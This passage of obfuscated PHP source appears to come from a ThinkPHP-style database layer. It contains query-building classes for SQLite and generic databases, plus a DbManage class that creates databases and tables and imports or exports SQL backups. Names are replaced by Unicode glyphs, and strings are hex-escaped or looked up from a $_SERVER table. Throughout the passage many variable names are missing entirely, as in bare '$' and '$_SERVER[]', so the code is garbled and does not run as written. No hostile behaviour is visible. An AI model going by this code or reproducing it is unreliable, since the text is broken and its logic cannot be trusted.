$this->_linkID->escapeString($ڿϔ); } return str_ireplace($ϓ[58], $ϓ[59], $ڿϔ); } public function parseLimit($ʉ) { $ՁɊ =& $_SERVER[]; $벺 = $ՁɊ[12]; if (!empty($ʉ)) { $ʉ = explode($ՁɊ[50], $ʉ); if (count($ʉ) > 1) { $벺 .= $ՁɊ[51] . $ʉ[1] . $ՁɊ[52] . $ʉ[0] . $ՁɊ[53]; } else { $벺 .= $ՁɊ[51] . $ʉ[0] . $ՁɊ[53]; } } return $벺; } } goto aє; a: class DbSqlite3 extends DbSqlite3Base { protected function _execSql($Ϣ) { if (!$this->_linkID || !$Ϣ) { return; } $this->_linkID->exec($Ϣ); } protected function initConnectAfter() { $٠È =& $_SERVER[]; $this->_execSql($٠È[1119]); $this->_execSql($٠È[1120]); } public function query($) { $㠬 = parent::query($); return $㠬; } public function execute($) { $Ҩٽ =& $_SERVER[]; if (!CacheLock::fileLock($Ҩٽ[1121])) { return !1; } $ǟӚ = parent::execute($); CacheLock::fileUnLock($Ҩٽ[1121]); return $ǟӚ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\161" => "\x3c\x3e", "\147\164" => "\76", "\x65\147\164" => "\x3e\75", "\154\164" => "\x3c", "\145\154\x74" => "\x3c\x3d", "\156\x6f\164\154\151\153\145" => "\x4e\117\124\x20\114\111\113\x45", "\x6c\x69\x6b\x65" => "\x4c\x49\x4b\x45", "\x69\156" => "\111\116", "\156\157\164\x69\156" => "\116\117\x54\x20\x49\x4e", "\x6e\157\x74\40\x69\x6e" => "\x4e\117\x54\40\111\116", "\142\145\x74\x77\x65\145\x6e" => "\x42\x45\x54\x57\x45\x45\116", "\x6e\x6f\164\x62\x65\164\167\x65\145\156" => "\116\x4f\x54\x20\x42\105\x54\x57\105\x45\x4e", "\x6e\157\164\x20\142\x65\x74\167\x65\145\x6e" => "\116\117\x54\40\102\105\x54\x57\105\105\x4e"); protected $selectSql = "\123\105\x4c\x45\103\x54\45\104\111\123\124\111\116\103\124\45\40\x25\x46\111\x45\114\104\45\40\106\122\117\115\40\x25\x54\x41\102\114\105\45\45\112\x4f\x49\116\45\x25\127\x48\105\x52\x45\45\45\x47\122\x4f\125\x50\x25\x25\110\x41\x56\111\x4e\x47\45\x25\117\x52\x44\x45\x52\45\x25\x4c\x49\x4d\x49\124\x25\40\45\x55\x4e\111\117\116\45\x25\103\117\x4d\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][1122], $); } public function factory($ʺ = '') { $Ӻ =& $_SERVER[]; $ʺ = $this->parseConfig($ʺ); if (empty($ʺ[$Ӻ[1123]])) { think_exception(think_lang($Ӻ[1124])); } $this->dbType = ucwords(strtolower($ʺ[$Ӻ[1123]])); $ = $Ӻ[1125] . $this->dbType; if (class_exists($)) { $ = new $($ʺ); if ($Ӻ[1126] != strtolower($ʺ[$Ӻ[1123]])) { $->dbType = strtoupper($this->dbType); } else { $->dbType = $this->_getDsnType($ʺ[$Ӻ[1075]]); } } else { think_exception(think_lang($Ӻ[1127]) . $Ӻ[1128] . $); } return $; } public function __call($ݑ, $) { if (method_exists($this, $ݑ)) { return call_user_func_array(array($this, $ݑ), $); } } protected function _getDsnType($氅) { $ʐ = explode($_SERVER[][4], $氅); $灚 = strtoupper(trim($ʐ[0])); return $灚; } private function parseConfig($ = '') { $ɢ =& $_SERVER[]; if (!empty($) && is_string($)) { $ = $this->parseDSN($); } elseif (is_array($)) { $ = array_change_key_case($); $ = array($ɢ[1123] => $[$ɢ[1129]], $ɢ[1044] => $[$ɢ[1130]], $ɢ[1045] => $[$ɢ[1131]], $ɢ[1042] => $[$ɢ[1132]], $ɢ[1043] => $[$ɢ[1133]], $ɢ[21] => $[$ɢ[1134]], $ɢ[1075] => $[$ɢ[1135]], $ɢ[17] => isset($[$ɢ[1136]]) ? $[$ɢ[1136]] : array()); } elseif (empty($)) { if (think_config($ɢ[1137]) && $ɢ[1126] != strtolower(think_config($ɢ[1138]))) { $ = $this->parseDSN(think_config($ɢ[1137])); } else { $ = array($ɢ[1123] => think_config($ɢ[1138]), $ɢ[1044] => think_config($ɢ[1139]), $ɢ[1045] => think_config($ɢ[1140]), $ɢ[1042] => think_config($ɢ[1141]), $ɢ[1043] => think_config($ɢ[1142]), $ɢ[21] => think_config($ɢ[323]), $ɢ[1075] => think_config($ɢ[1137]), $ɢ[17] => think_config($ɢ[1143])); } } return $; } protected function initConnect($ = true) { if (1 == think_config($_SERVER[][22])) { $this->_linkID = $this->multiConnect($); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } $this->initConnectAfter(); } protected function initConnectAfter() { } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ => $) { $this->_linkID = $; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ȍ܇ = false) { $ =& $_SERVER[]; static $㲹ܲ = array(); static $׮ = -1; if (empty($㲹ܲ)) { foreach ($this->config as $ƈ => $) { $㲹ܲ[$ƈ] = explode($[50], $); } } if (think_config($[1144])) { if ($Ȍ܇ || think_config($[486]) === !0) { $ܵ = floor(mt_rand(0, think_config($[1145]) - 1)); $׮ = $ܵ; } else { if (is_numeric(think_config($[1146]))) { $ܵ = think_config($[1146]); } else { $ܵ = floor(mt_rand(think_config($[1145]), count($㲹ܲ[$[1042]]) - 1)); } } } else { $ܵ = floor(mt_rand(0, count($㲹ܲ[$[1042]]) - 1)); $׮ = $ܵ; } $ܵ = $׮ !== -1 ? $׮ : $ܵ; $ѣ = array($[1044] => isset($㲹ܲ[$[1044]][$ܵ]) ? $㲹ܲ[$[1044]][$ܵ] : $㲹ܲ[$[1044]][0], $[1045] => isset($㲹ܲ[$[1045]][$ܵ]) ? $㲹ܲ[$[1045]][$ܵ] : $㲹ܲ[$[1045]][0], $[1042] => isset($㲹ܲ[$[1042]][$ܵ]) ? $㲹ܲ[$[1042]][$ܵ] : $㲹ܲ[$[1042]][0], $[1043] => isset($㲹ܲ[$[1043]][$ܵ]) ? $㲹ܲ[$[1043]][$ܵ] : $㲹ܲ[$[1043]][0], $[21] => isset($㲹ܲ[$[21]][$ܵ]) ? $㲹ܲ[$[21]][$ܵ] : $㲹ܲ[$[21]][0], $[1075] => isset($㲹ܲ[$[1075]][$ܵ]) ? $㲹ܲ[$[1075]][$ܵ] : $㲹ܲ[$[1075]][0], $[17] => isset($㲹ܲ[$[17]][$ܵ]) ? $㲹ܲ[$[17]][$ܵ] : $㲹ܲ[$[17]][0]); return $this->connect($ѣ, $ܵ); } public function parseDSN($) { $ӫ =& $_SERVER[]; if (empty($)) { return !1; } $ = parse_url($); if ($[$ӫ[205]]) { $Ϙ = array($ӫ[1123] => $[$ӫ[205]], $ӫ[1044] => isset($[$ӫ[684]]) ? $[$ӫ[684]] : $ӫ[12], $ӫ[1045] => isset($[$ӫ[1147]]) ? $[$ӫ[1147]] : $ӫ[12], $ӫ[1042] => isset($[$ӫ[206]]) ? $[$ӫ[206]] : $ӫ[12], $ӫ[1043] => isset($[$ӫ[207]]) ? $[$ӫ[207]] : $ӫ[12], $ӫ[21] => isset($[$ӫ[87]]) ? substr($[$ӫ[87]], 1) : $ӫ[12]); } else { preg_match($ӫ[1148], trim($), $); $Ϙ = array($ӫ[1123] => $[1], $ӫ[1044] => $[2], $ӫ[1045] => $[3], $ӫ[1042] => $[4], $ӫ[1043] => $[5], $ӫ[21] => $[6]); } $Ϙ[$ӫ[1075]] = $ӫ[12]; return $Ϙ; } protected function debug() { $ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $[1149]; if (think_config($[1150])) { think_status($[1151]); think_trace($this->queryStr . $[1152] . think_status($[24], $[1151], 6) . $[1153], $[12], $[1154]); } } protected function parseLock($ = false) { $Բ =& $_SERVER[]; if (!$) { return $Բ[12]; } if ($Բ[1077] == $this->dbType) { return $Բ[1155]; } return $Բ[1156]; } protected function parseSet($ڸ) { $ =& $_SERVER[]; foreach ($ڸ as $ˋг => $) { if (is_array($) && $[372] == $[0]) { $[] = $this->parseKey($ˋг) . $[464] . $[1]; } elseif (is_scalar($) || is_null($)) { $[] = $this->parseKey($ˋг) . $[464] . $this->parseValue($); } } return $[1157] . implode($[50], $); } protected function bindParam($ӄ, $ﹾ) { $this->bind[$_SERVER[][4] . $ӄ] = $ﹾ; } protected function parseBind($) { $ = array_merge($this->bind, $); $this->bind = array(); return $; } function parseKey(&$ȩ, $ = true) { if ($) { $ȩ = $this->parseKeyCheck($ȩ); } return $ȩ; } function parseKeyCheck($깈) { $ڮԲ =& $_SERVER[]; $깈 = trim($깈); if (!preg_match($ڮԲ[1158], $깈)) { think_exception($ڮԲ[1159] . $깈); } return $깈; } protected function parseValue($) { $Ŷ =& $_SERVER[]; if (is_string($)) { $ = $Ŷ[1116] . $this->escapeString($) . $Ŷ[1116]; } elseif (isset($[0]) && is_string($[0]) && strtolower($[0]) == $Ŷ[372]) { $ = $this->escapeString($[1]); } elseif (is_array($)) { $ = array_map(array($this, $Ŷ[1117]), $); } elseif (is_bool($)) { $ = $ ? $Ŷ[91] : $Ŷ[228]; } elseif (is_null($)) { $ = $Ŷ[103]; } return $; } protected function parseField($) { $ =& $_SERVER[]; if (is_string($) && strpos($, $[50])) { $ = explode($[50], $); } if (is_array($)) { $ = array(); foreach ($ as $ď => $) { if (!is_numeric($ď)) { $[] = $this->parseKey($ď, !1) . $[1160] . $this->parseKey($); } else { $[] = $this->parseKey($); } } $ = implode($[50], $); } elseif (is_string($) && !empty($)) { $ = $; } else { $ = $[220]; } return $; } protected function parseTable($ڠ) { $Ǯ =& $_SERVER[]; if (is_array($ڠ)) { $躊 = array(); foreach ($ڠ as $ => $ôڑ) { if (!is_numeric($)) { $躊[] = $this->parseKey($) . $Ǯ[53] . $this->parseKey($ôڑ); } else { $躊[] = $this->parseKey($); } } $ڠ = $躊; } elseif (is_string($ڠ)) { if (strstr($ڠ, $Ǯ[53])) { return $ڠ; } $ڠ = explode($Ǯ[50], $ڠ); array_walk($ڠ, array($this, $Ǯ[1062])); } return $Ǯ[1056] . trim(implode($Ǯ[1161], $ڠ), $Ǯ[475]) . $Ǯ[1056]; } protected function parseWhere($) { $瞋 =& $_SERVER[]; $ص = $瞋[12]; if (is_string($)) { $ص = $; } else { $򆭸 = isset($[$瞋[1162]]) ? strtoupper($[$瞋[1162]]) : $瞋[12]; if (in_array($򆭸, array($瞋[1163], $瞋[1164], $瞋[1165]))) { $򆭸 = $瞋[53] . $򆭸 . $瞋[53]; unset($[$瞋[1162]]); } else { $򆭸 = $瞋[1166]; } foreach ($ as $յ => $榀) { $ص .= $瞋[355]; if (is_numeric($յ)) { $յ = $瞋[1167]; } if (0 === strpos($յ, $瞋[11])) { $ص .= $this->parseThinkWhere($յ, $榀); } else { if (!preg_match($瞋[1168], trim($յ))) { think_exception(think_lang($瞋[1169]) . $瞋[4] . $յ); } $༤ = is_array($榀) && isset($榀[$瞋[1170]]); $յ = trim($յ); if (strpos($յ, $瞋[212])) { $Ҽ㗭 = explode($瞋[212], $յ); $̤ = array(); foreach ($Ҽ㗭 as $稝 => $) { $ = $༤ ? $榀[$稝] : $榀; $̤[] = $瞋[337] . $this->parseWhereItem($this->parseKey($), $) . $瞋[1061]; } $ص .= implode($瞋[1171], $̤); } elseif (strpos($յ, $瞋[284])) { $Ҽ㗭 = explode($瞋[284], $յ); $̤ = array(); foreach ($Ҽ㗭 as $稝 => $) { $ = $༤ ? $榀[$稝] : $榀; $̤[] = $瞋[337] . $this->parseWhereItem($this->parseKey($), $) . $瞋[1061]; } $ص .= implode($瞋[1166], $̤); } else { $ص .= $this->parseWhereItem($this->parseKey($յ), $榀); } } $ص .= $瞋[356] . $򆭸; } $ص = substr($ص, 0, -strlen($򆭸)); } return empty($ص) ? $瞋[12] : $瞋[1172] . $ص; } protected function parseWhereItem($, $ʣ) { $ȾÌ =& $_SERVER[]; $ǲ = $ȾÌ[12]; if (is_array($ʣ)) { if (is_string($ʣ[0])) { $ = strtolower($ʣ[0]); if (in_array($ʣ[0], array($ȾÌ[464], $ȾÌ[1173], $ȾÌ[1174], $ȾÌ[1175], $ȾÌ[1176], $ȾÌ[1177]))) { $ǲ .= $ . $ȾÌ[53] . $ʣ[0] . $ȾÌ[53] . $this->parseValue($ʣ[1]); } elseif (preg_match($ȾÌ[1178], $ʣ[0])) { $ǲ .= $ . $ȾÌ[53] . $this->exp[$] . $ȾÌ[53] . $this->parseValue($ʣ[1]); } elseif (preg_match($ȾÌ[1179], $ʣ[0])) { if (is_array($ʣ[1])) { $ = isset($ʣ[2]) ? strtoupper($ʣ[2]) : $ȾÌ[1164]; if (in_array($, array($ȾÌ[1163], $ȾÌ[1164], $ȾÌ[1165]))) { $ߐ = array(); foreach ($ʣ[1] as $μ) { $ߐ[] = $ . $ȾÌ[53] . $this->exp[$] . $ȾÌ[53] . $this->parseValue($μ); } $ǲ .= $ȾÌ[337] . implode($ȾÌ[53] . $ . $ȾÌ[53], $ߐ) . $ȾÌ[1061]; } } else { $ǲ .= $ . $ȾÌ[53] . $this->exp[$] . $ȾÌ[53] . $this->parseValue($ʣ[1]); } } elseif ($ȾÌ[372] == $) { $ǲ .= $ȾÌ[1059] . $ . $ȾÌ[53] . $ʣ[1] . $ȾÌ[1180]; } elseif (preg_match($ȾÌ[1181], $ʣ[0])) { $ǲ .= $ʣ[0]; } elseif (preg_match($ȾÌ[1182], $ʣ[0])) { if (isset($ʣ[2]) && $ȾÌ[372] == $ʣ[2]) { $ǲ .= $ . $ȾÌ[53] . $this->exp[$] . $ȾÌ[53] . $ʣ[1]; } else { if (is_string($ʣ[1])) { $ʣ[1] = explode($ȾÌ[50], $ʣ[1]); } $ = implode($ȾÌ[50], $this->parseValue($ʣ[1])); $ǲ .= $ . $ȾÌ[53] . $this->exp[$] . $ȾÌ[1059] . $ . $ȾÌ[1061]; } } elseif (preg_match($ȾÌ[1183], $ʣ[0])) { $ۋ = is_string($ʣ[1]) ? explode($ȾÌ[50], $ʣ[1]) : $ʣ[1]; $ǲ .= $ȾÌ[1059] . $ . $ȾÌ[53] . $this->exp[$] . $ȾÌ[53] . $this->parseValue($ۋ[0]) . $ȾÌ[1166] . $this->parseValue($ۋ[1]) . $ȾÌ[356]; } else { think_exception(think_lang($ȾÌ[1169]) . $ȾÌ[4] . $ʣ[0]); } } else { $̐ = count($ʣ); $ι = $ȾÌ[12]; if (is_string($ʣ[$̐ - 1])) { $ι = isset($ʣ[$̐ - 1]) ? strtoupper($ʣ[$̐ - 1]) : $ȾÌ[12]; if (in_array($ι, array($ȾÌ[1163], $ȾÌ[1164], $ȾÌ[1165]))) { $̐ = $̐ - 1; } } else { $ι = $ȾÌ[1163]; } for ($ = 0; $ < $̐; $++) { $ۋ = is_array($ʣ[$]) ? $ʣ[$][1] : $ʣ[$]; if ($ȾÌ[372] == strtolower($ʣ[$][0])) { $ǲ .= $ȾÌ[337] . $ . $ȾÌ[53] . $ۋ . $ȾÌ[1180] . $ι . $ȾÌ[53]; } else { $ = is_array($ʣ[$]) ? $this->exp[strtolower($ʣ[$][0])] : $ȾÌ[464]; if (!$ && is_array($ʣ[$]) && in_array($ʣ[$][0], array($ȾÌ[464], $ȾÌ[1173], $ȾÌ[1174], $ȾÌ[1175], $ȾÌ[1176], $ȾÌ[1177]))) { $ = $ʣ[$][0]; } $ǲ .= $ȾÌ[337] . $ . $ȾÌ[53] . $ . $ȾÌ[53] . $this->parseValue($ۋ) . $ȾÌ[1180] . $ι . $ȾÌ[53]; } } $ǲ = substr($ǲ, 0, -4); } } else { $ǲ .= $ . $ȾÌ[1184] . $this->parseValue($ʣ); } return $ǲ; } protected function parseThinkWhere($Ȗ, $݇) { $י =& $_SERVER[]; $ = $י[12]; switch ($Ȗ) { case $י[427]: $ = $݇; break; case $י[1167]: $ = is_string($݇) ? $݇ : substr($this->parseWhere($݇), 6); break; case $י[1185]: parse_str($݇, $); if (isset($[$י[1162]])) { $، = $י[53] . strtoupper($[$י[1162]]) . $י[53]; unset($[$י[1162]]); } else { $، = $י[1166]; } $윷 = array(); foreach ($ as $ӳ => $) { $윷[] = $this->parseKey($ӳ) . $י[1184] . $this->parseValue($); } $ = implode($،, $윷); break; } return $; } protected function parseLimit($ç) { $ =& $_SERVER[]; return !empty($ç) ? $[51] . $ç . $[53] : $[12]; } protected function parseJoin($銢) { $۸ =& $_SERVER[]; $ = $۸[12]; if (!empty($銢)) { if (is_array($銢)) { foreach ($銢 as $ě齴 => $) { if (!1 !== stripos($, $۸[1186])) { $ .= $۸[53] . $; } else { $ .= $۸[1187] . $; } } } else { $ .= $۸[1187] . $銢; } } $ = preg_replace($۸[1188], think_config($۸[1089]) . $۸[1189], $); return $; } protected function parseOrder($ۻ) { $ =& $_SERVER[]; if (is_array($ۻ)) { $ = array(); foreach ($ۻ as $ => $Ϊ) { if (is_numeric($)) { $[] = $this->parseKey($Ϊ); } else { $Ϊ = in_array(strtoupper(trim($Ϊ)), array($[1190], $[1191])) ? $[53] . $Ϊ : $[12]; if (preg_match($[1192], $)) { $[] = $this->parseKey($) . $Ϊ; } else { think_exception($[1193] . $); } } } $ۻ = implode($[50], $); } return !empty($ۻ) ? $[1194] . $ۻ : $[12]; } protected function parseGroup($̟̰) { $ =& $_SERVER[]; return !empty($̟̰) ? $[1195] . $̟̰ : $[12]; } protected function parseHaving($쥇) { $ޓ =& $_SERVER[]; return !empty($쥇) ? $ޓ[1196] . $쥇 : $ޓ[12]; } protected function parseComment($) { $電 =& $_SERVER[]; return !empty($) ? $電[1197] . $ . $電[1198] : $電[12]; } protected function parseDistinct($) { $殺 =& $_SERVER[]; return !empty($) ? $殺[1199] : $殺[12]; } protected function parseUnion($땢) { $䢭 =& $_SERVER[]; if (empty($땢)) { return $䢭[12]; } if (isset($땢[$䢭[423]])) { $ = $䢭[1200]; unset($땢[$䢭[423]]); } else { $ = $䢭[1201]; } foreach ($땢 as $̕) { $ۨ[] = $ . (is_array($̕) ? $this->buildSelectSql($̕) : $̕); } return implode($䢭[53], $ۨ); } public function insert($ԒӀ, $ = array(), $ŕ = false) { $Ð =& $_SERVER[]; $᪙ = $Ɉɚ = array(); $this->model = $[$Ð[359]]; foreach ($ԒӀ as $ => $ȼ) { if (is_array($ȼ) && $Ð[372] == $ȼ[0]) { $Ɉɚ[] = $this->parseKey($); $᪙[] = $ȼ[1]; } elseif (is_scalar($ȼ) || is_null($ȼ)) { $Ɉɚ[] = $this->parseKey($); $᪙[] = $this->parseValue($ȼ); } } $߈ = ($ŕ ? $Ð[1063] : $Ð[1064]) . $Ð[1065] . $this->parseTable($[$Ð[357]]) . $Ð[1059] . implode($Ð[50], $Ɉɚ) . $Ð[1060] . implode($Ð[50], $᪙) . $Ð[1061]; $߈ .= $this->parseLock(isset($[$Ð[1002]]) ? $[$Ð[1002]] : !1); $߈ .= $this->parseComment(!empty($[$Ð[429]]) ? $[$Ð[429]] : $Ð[12]); return $this->execute($߈, $this->parseBind(!empty($[$Ð[361]]) ? $[$Ð[361]] : array())); } public function selectInsert($ƈ, $Ǣ̪, $ = array()) { $ =& $_SERVER[]; $this->model = $[$[359]]; if (is_string($ƈ)) { $ƈ = explode($[50], $ƈ); } array_walk($ƈ, array($this, $[1062])); $ܼ = $[1202] . $this->parseTable($Ǣ̪) . $[1059] . implode($[50], $ƈ) . $[1180]; $ܼ .= $this->buildSelectSql($); return $this->execute($ܼ, $this->parseBind(!empty($[$[361]]) ? $[$[361]] : array())); } public function update($Ӿ, $) { $ =& $_SERVER[]; $this->model = $[$[359]]; $ڭ = $[1203] . $this->parseTable($[$[357]]) . $this->parseSet($Ӿ) . $this->parseWhere(!empty($[$[353]]) ? $[$[353]] : $[12]) . $this->parseOrder(!empty($[$[441]]) ? $[$[441]] : $[12]) . $this->parseLimit(!empty($[$[368]]) ? $[$[368]] : $[12]) . $this->parseLock(isset($[$[1002]]) ? $[$[1002]] : !1) . $this->parseComment(!empty($[$[429]]) ? $[$[429]] : $[12]); return $this->execute($ڭ, $this->parseBind(!empty($[$[361]]) ? $[$[361]] : array())); } public function delete($ = array()) { $ؑ =& $_SERVER[]; $this->model = $[$ؑ[359]]; $ = $ؑ[1204] . $this->parseTable($[$ؑ[357]]) . $this->parseWhere(!empty($[$ؑ[353]]) ? $[$ؑ[353]] : $ؑ[12]) . $this->parseOrder(!empty($[$ؑ[441]]) ? $[$ؑ[441]] : $ؑ[12]) . $this->parseLimit(!empty($[$ؑ[368]]) ? $[$ؑ[368]] : $ؑ[12]) . $this->parseLock(isset($[$ؑ[1002]]) ? $[$ؑ[1002]] : !1) . $this->parseComment(!empty($[$ؑ[429]]) ? $[$ؑ[429]] : $ؑ[12]); return $this->execute($, $this->parseBind(!empty($[$ؑ[361]]) ? $[$ؑ[361]] : array())); } public function select($È = array()) { $߭ =& $_SERVER[]; $this->model = $È[$߭[359]]; $Н瞛 = $this->buildSelectSql($È); $őԐ = isset($È[$߭[424]]) ? $È[$߭[424]] : !1; if ($őԐ) { $Ӫ = is_string($őԐ[$߭[95]]) ? $őԐ[$߭[95]] : $߭[1205] . md5($Н瞛); $ = think_cache($Ӫ, $߭[12], $őԐ); if (!1 !== $) { return $; } } $ = $this->query($Н瞛, $this->parseBind(!empty($È[$߭[361]]) ? $È[$߭[361]] : array())); if ($őԐ && !1 !== $) { think_cache($Ӫ, $, $őԐ); } return $; } public function buildSelectSql($ = array()) { $ɿ =& $_SERVER[]; if (isset($[$ɿ[428]])) { if (strpos($[$ɿ[428]], $ɿ[50])) { list($, $) = explode($ɿ[50], $[$ɿ[428]]); } else { $ = $[$ɿ[428]]; } $ = $ ? $ : 1; $ = isset($) ? $ : (is_numeric($[$ɿ[368]]) ? $[$ɿ[368]] : 20); $ = $ * ((int) $ - 1); $[$ɿ[368]] = $ . $ɿ[50] . $; } if (think_config($ɿ[1206])) { $ǹ = $ɿ[1207] . md5(serialize($)); $۝ = think_cache($ǹ); if ($۝) { return $۝; } } $Ҽ = $this->parseSql($this->selectSql, $); $Ҽ .= $this->parseLock(isset($[$ɿ[1002]]) ? $[$ɿ[1002]] : !1); if (isset($ǹ)) { think_cache($ǹ, $Ҽ); } return $Ҽ; } public function parseSql($, $ = array()) { $Ӣ =& $_SERVER[]; $ = str_replace(array($Ӣ[1208], $Ӣ[1209], $Ӣ[1210], $Ӣ[1211], $Ӣ[1212], $Ӣ[1213], $Ӣ[1214], $Ӣ[1215], $Ӣ[1216], $Ӣ[1217], $Ӣ[1218]), array($this->parseTable("{$[$Ӣ[357]]}"), $this->parseDistinct(isset($[$Ӣ[1219]]) ? $[$Ӣ[1219]] : !1), $this->parseField(!empty($[$Ӣ[351]]) ? $[$Ӣ[351]] : $Ӣ[220]), $this->parseJoin(!empty($[$Ӣ[360]]) ? $[$Ӣ[360]] : $Ӣ[12]), $this->parseWhere(!empty($[$Ӣ[353]]) ? $[$Ӣ[353]] : $Ӣ[12]), $this->parseGroup(!empty($[$Ӣ[598]]) ? $[$Ӣ[598]] : $Ӣ[12]), $this->parseHaving(!empty($[$Ӣ[1220]]) ? $[$Ӣ[1220]] : $Ӣ[12]), $this->parseOrder(!empty($[$Ӣ[441]]) ? $[$Ӣ[441]] : $Ӣ[12]), $this->parseLimit(!empty($[$Ӣ[368]]) ? $[$Ӣ[368]] : $Ӣ[12]), $this->parseUnion(!empty($[$Ӣ[422]]) ? $[$Ӣ[422]] : $Ӣ[12]), $this->parseComment(!empty($[$Ӣ[429]]) ? $[$Ӣ[429]] : $Ӣ[12])), $); return $; } public function getLastSql($ = '') { return $ ? $this->modelSql[$] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($) { return addslashes($); } public function setModel($ɡ) { $this->model = $ɡ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { public $message = ''; function __construct($ = array()) { $ҿڼ =& $_SERVER[]; if (empty($)) { $ = $GLOBALS[$ҿڼ[6]][$ҿڼ[21]]; } $this->database = $; } public function model($ = '') { return new ModelBase($, $_SERVER[][12], $this->database); } public function db($զ = false) { $뗤 =& $_SERVER[]; $¾ = array_change_key_case($this->database); if ($this->dbType() == $뗤[13] || !$զ) { return $this->model()->db(); } $֯ = $¾[$뗤[1134]]; $¾[$뗤[1134]] = $뗤[12]; if ($¾[$뗤[1129]] == $뗤[1126]) { $ = $¾[$뗤[1135]]; $¾[$뗤[1135]] = substr($, 0, strrpos($, $뗤[1221])); } $this->database = $¾; $ = $this->model()->db(); $ = $->execute("\163\150\157\167\40\144\141\164\x61\x62\141\163\145\163\40\154\x69\x6b\x65\40\x27{$֯}\47"); if (!$) { try { $->execute("\x63\x72\x65\141\x74\x65\x20\144\141\x74\x61\142\x61\163\x65\x20\x60{$֯}\x60"); } catch (Exception $) { $this->message = $->getMessage(); return !1; } } $¾[$뗤[1134]] = $֯; if ($¾[$뗤[1129]] == $뗤[1126]) { $¾[$뗤[1135]] .= $뗤[1221] . $֯; } $this->database = $¾; try { $->execute("\165\x73\x65\40\x60{$֯}\x60"); } catch (Exception $) { $this->message = $->getMessage(); return !1; } return $; } public function createTable($ر, &$) { $ =& $_SERVER[]; if (!IO::exist($ر)) { show_json(LNG($[1222]), !1); } $ = $this->model()->db(); $ = IO::getContent($ر); $ = str_ireplace($[1223], $[1224], $); $Ȼ = sqlSplit($); foreach ($Ȼ as $ֳ) { $ = stripos($ֳ, $[1225]) === 0; if ($) { $->task[$[1226]] += 1; } $->execute($ֳ); if ($) { preg_match($[1227], $ֳ, $Ώ); $->task[$[1228]] = $Ώ[1]; $->update(1); } } } public function insertTable($٪, &$Ǐ) { $徱 =& $_SERVER[]; $ = $this->model()->db(); $ٴ = $ ? array($) : $->getTables(); foreach ($٪ as $) { $ = basename($, $徱[885]); if (!in_array($, $ٴ)) { continue; } $Ǐ->task[$徱[1228]] = $; if ($ == $徱[472]) { continue; } if (get_filesize($) == 0) { continue; } $ = $this->sqlToDb($, $Ǐ); if (!$) { show_json(LNG($徱[1229]) . "\x5b{$}\135", !1); } } } public function sqlFromDb($, $ٸ, &$Պ, $ = '') { $Ս =& $_SERVER[]; if ($Պ) { $Պ->task[$Ս[1228]] = $; } $ = $this->model($); $ٸ = 0; $ѧ户 = 0; $䠨 = 10000; $ڇ = fopen($ٸ, $Ս[1230]); $ȟ = $->getPk(); $͕ = $->getDbFields(); $݆ = $Ս[12]; if ($GLOBALS[$Ս[884]] && in_array($, array($Ս[1231], $Ս[1232]))) { $݆ = $; } do { $𩜏 = array($ȟ => array($Ս[1176], $ѧ户)); $ݿ = $->where($𩜏)->field($͕)->order($ȟ . $Ս[1233])->limit($䠨)->select(); $ݿ = !empty($ݿ) ? $ݿ : array(); if (!($ = count($ݿ))) { break; } $ī = end($ݿ); $ѧ户 = $ī[$ȟ]; $ȟ = array(); foreach ($ݿ as $) { if ($݆) { if ($ == $Ս[1231]) { if ($[$Ս[33]] == $Ս[1234]) { $ = json_decode($[$Ս[451]], !0); if ($[$Ս[32]] == $GLOBALS[$Ս[884]] && $[$Ս[844]] != 1) { continue; } } } else { if ($[$Ս[33]] == $Ս[1235] && $[$Ս[95]] == $Ս[880]) { continue; } } } $ȟ[] = $Ս[1236] . $this->sqlEncode($) . $Ս[1237]; } $ = "\x49\x4e\123\x45\122\x54\x20\111\x4e\x54\x4f\x20\140{$}\x60\40\x28\140" . implode($Ս[1238], $͕) . $Ս[1239]; fwrite($ڇ, $ . implode($Ս[1240], $ȟ) . $Ս[74] . PHP_EOL); $ٸ += $; if ($Պ) { $Պ->update($); } } while ($䠨 == $); fclose($ڇ); return $ٸ; } public function sqlToDb($ܠ, &$) { $ڽ =& $_SERVER[]; $ɿ = $this->model()->db(); $ = @fopen($ܠ, $ڽ[1241]); if (!$) { return !1; } $ = 0; $ɉڤ = $ڽ[12]; $ = array(); $䎘 = $this->dbType(); $ = $䎘 == $ڽ[13] ? 500 : 2000; $ = basename($ܠ, $ڽ[885]); $ = 0; $ = 4194304; while (!feof($)) { $Ȱ = trim(fgets($)); if (!$Ȱ) { continue; } $ = $this->sqlDecode($Ȱ, $䎘, $); if (stripos($, $ڽ[430]) === 0) { if (!$ɉڤ) { $ɉڤ = $ . $ڽ[53]; } continue; } if ($) { $->task[$ڽ[1226]] += 1; } $++; $[] = rtrim(rtrim(trim($), $ڽ[50]), $ڽ[74]); $ = null; $ = strlen($); $ += $; $籈 = strlen($ɉڤ) + $ + (count($) - 1); if ($籈 >= $) { $ = array_pop($); if ($ > 1) { $--; } } if ($ >= $ || $) { $ = $ɉڤ . implode($ڽ[50], $); if (!$ɿ->execute($)) { return !1; } if ($) { $->update($); } $ = array(); $ = 0; $ = 0; if ($) { $ = array($); $ = 1; $ = $; } } } fclose($); if (!empty($)) { $ = $ɉڤ . implode($ڽ[50], $); if (!$ɿ->execute($)) { return !1; } if ($) { $->update($); } } return !0; } public function dropTable($Ƶ = null) { $熖 =& $_SERVER[]; $َ = $this->model()->db(); $ѵ؟ = $Ƶ ? array($Ƶ) : $َ->getTables(); if (!$ѵ؟) { return; } foreach ($ѵ؟ as 